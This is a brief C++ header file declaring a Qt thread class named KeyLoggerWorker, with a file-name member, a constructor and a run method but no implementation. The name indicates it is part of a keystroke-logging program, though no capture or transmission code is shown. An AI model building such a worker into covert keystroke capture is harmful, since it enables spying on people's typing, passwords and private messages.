#include <QThread>
#include <QtCore>

class KeyLoggerWorker : public QThread
{
  public:
  QString m_fileName;

  explicit KeyLoggerWorker(QString fileName);
  void run();
};
